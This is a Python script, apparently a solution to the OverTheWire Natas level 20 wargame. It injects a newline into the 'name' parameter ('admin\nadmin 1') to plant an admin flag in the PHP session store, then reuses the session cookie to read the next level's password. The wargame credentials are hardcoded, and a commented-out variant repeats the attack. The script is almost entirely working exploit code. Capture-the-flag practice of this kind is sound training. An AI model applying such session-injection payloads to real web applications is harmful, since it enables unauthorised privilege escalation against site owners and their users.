# import requests, string
# from time import *

import requests


AUTH=requests.auth.HTTPBasicAuth('natas20', 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')
URL = "http://natas20.natas.labs.overthewire.org?name=admin\nadmin 1"

# First request to get the cookie
response = requests.get(URL, auth=AUTH)
response_cookie = response.cookies['PHPSESSID']
cookie = {'PHPSESSID': response_cookie}

# Second request to get the password
response = requests.get(URL, auth=AUTH, cookies=cookie)
print(response.text)


# target = 'http://natas20.natas.labs.overthewire.org'
# auth = ('natas20', 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')

# print( "#")
# print ("# FIRST REQUEST")
# print( "#")
# params = dict(name='admin\nadmin 1', debug='')

# cookies = dict()
# r = requests.get(target, auth=auth, params=params, cookies=cookies)
# phpsessid = r.cookies['PHPSESSID']
# print (r.text)

# print( "\n\n")
# print( "#")
# print ("# SECOND REQUEST")
# print( "#")
# params = dict(debug='')
# cookies = dict(PHPSESSID=phpsessid)
# r = requests.get(target, auth=auth, params=params, cookies=cookies)
# print (r.text)